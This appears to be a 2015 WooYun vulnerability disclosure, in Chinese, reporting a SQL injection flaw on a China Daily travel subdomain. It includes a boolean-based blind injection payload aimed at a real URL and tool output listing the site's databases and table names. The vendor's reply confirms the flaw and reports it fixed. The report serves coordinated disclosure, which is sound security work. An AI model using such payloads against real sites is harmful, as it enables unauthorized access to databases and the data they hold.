wybug_title: 中国日报某站存在伪静态SQL注射漏洞
wybug_detail:
漏洞详情 披露状态：   									2015-05-04：	细节已通知厂商并且等待厂商处理中									2015-05-05：	厂商已经确认，细节仅向厂商公开									2015-05-15：	细节向核心白帽子及相关领域专家公开									2015-05-25：	细节向普通白帽子公开									2015-06-04：	细节向实习白帽子公开									2015-06-09：	厂商已经修复漏洞并主动公开，细节向公众公开  简要描述： 233 详细说明：  
今天突然看到个玻璃镜框，然后就想到了咱们。哈哈url : http://travel.chinadaily.com.cn/trip/city/id/20/cate/*
   漏洞证明：  




---Parameter: #1* (URI)    Type: boolean-based blind    Title: MySQL >= 5.0 boolean-based blind - Parameter replace    Payload: http://travel.chinadaily.com.cn:80/trip/city/id/20/cate/(SELECT (CASE WHEN (3292=3292) THEN 3292 ELSE 3292*(SELECT 3292 FROM INFORMATION_SCHEMA.CHARACTER_SETS) END))---web application technology: Apacheback-end DBMS: MySQL 5.0available databases [3]:[*] ichuguo_searchen[*] information_schema[*] testDatabase: ichuguo_searchen[51 tables]+--------------------------+| Expo_Area                || Expo_City                || Expo_City_Area_Related   || Expo_Contacts            || Expo_Exhibit_Centre      || Expo_Exhibit_Industry    || Expo_Exhibit_Organizer   || Expo_Exhibit_Time        || Expo_Floorplan           || Expo_Industry_Category   || Expo_News                || Expo_Scene               || Expo_Type                || Exposition               || Exposition_copy          || _system_setting          || _wenda_city_discover     || _wenda_video             || _wenda_video_cate        || acl_admin_group          || acl_info                 || acl_info_bak             || admin_cluster            || admingroup               || adminuser                || adv_city                 || adv_common               || adv_hot_top10            || adv_news                 || area_attr                || area_category            || article                  || article_category         || article_category_related || article_recommend        || event                    || newsletter               || operate_logs             || recommend                || recommend_position       || site_info                || special                  || special_category         || special_category_related || special_operate_logs     || special_recommend        || special_template         || special_weekly           || subscribe_email          || vane                     || venue_info               |+--------------------------+
   修复方案：     版权声明：转载请注明来源 路人甲@乌云
wybug_reply: 漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2015-05-05 14:09 厂商回复： 十分感谢，联系同事修复。 最新状态： 2015-06-09：十分感谢。确认已修复 2015-06-09：确认修复
